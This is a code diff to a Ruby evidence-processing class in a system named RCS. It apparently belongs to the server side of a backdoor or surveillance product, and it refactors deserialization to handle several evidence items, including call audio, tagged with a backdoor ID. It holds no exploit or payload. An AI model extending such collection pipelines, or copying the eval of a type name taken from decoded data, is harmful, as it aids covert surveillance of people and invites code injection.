@@ -76,34 +76,36 @@ class InstanceProcessor
           begin
             # get evidence and deserialize it
             data = RCS::EvidenceManager.get_evidence(evidence_id, @id)
-            evidence = RCS::Evidence.new(@key).deserialize(data)
-            
-            # find correct processing module and extend evidence
-            mod = "#{evidence.type.to_s.capitalize}Processing"
-            evidence.extend eval mod if RCS.const_defined? mod.to_sym
-            
-            evidence.process if evidence.respond_to? :process
-            
-            case evidence.info[:type]
-              when :CALL
-                @audio_processor.feed(evidence)
-              else
-                done = false
-                until done
-                  begin
-                    evidence.info[:backdoor_id] = RCS::EvidenceManager.instance_info(@id)["bid"]
-                    RCS::DB::DB.evidence_store(evidence)
-                    RCS::EvidenceManager.del_evidence(evidence_id, @id)
-                    done = true
-                  rescue Exception => e
-                    trace :debug, "[#{Thread.current}][#{@id}] DB seems down, waiting for it to resume ... [#{e.message}]"
-                    sleep 1
+            evidences = RCS::Evidence.new(@key).deserialize(data)
+
+            evidences.each do |evidence|
+              # find correct processing module and extend evidence
+              mod = "#{evidence.type.to_s.capitalize}Processing"
+              evidence.extend eval mod if RCS.const_defined? mod.to_sym
+
+              evidence.process if evidence.respond_to? :process
+
+              case evidence.info[:type]
+                when :CALL
+                  @audio_processor.feed(evidence)
+                else
+                  done = false
+                  until done
+                    begin
+                      evidence.info[:backdoor_id] = RCS::EvidenceManager.instance_info(@id)["bid"]
+                      RCS::DB::DB.evidence_store(evidence)
+                      RCS::EvidenceManager.del_evidence(evidence_id, @id)
+                      done = true
+                    rescue Exception => e
+                      trace :debug, "[#{Thread.current}][#{@id}] DB seems down, waiting for it to resume ... [#{e.message}]"
+                      sleep 1
+                    end
                   end
-                end
+              end
+
+              trace :debug, "[#{Thread.current}][#{@id}] processed #{evidence_id} of type #{evidence.info[:type]}, #{data.size} bytes."
             end
-            
-            trace :debug, "[#{Thread.current}][#{@id}] processed #{evidence_id} of type #{evidence.info[:type]}, #{data.size} bytes."
-          
+
           rescue EvidenceDeserializeError => e
             trace :info, "[#{Thread.current}][#{@id}] decoding failed for #{evidence_id}: " << e.to_s
             # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
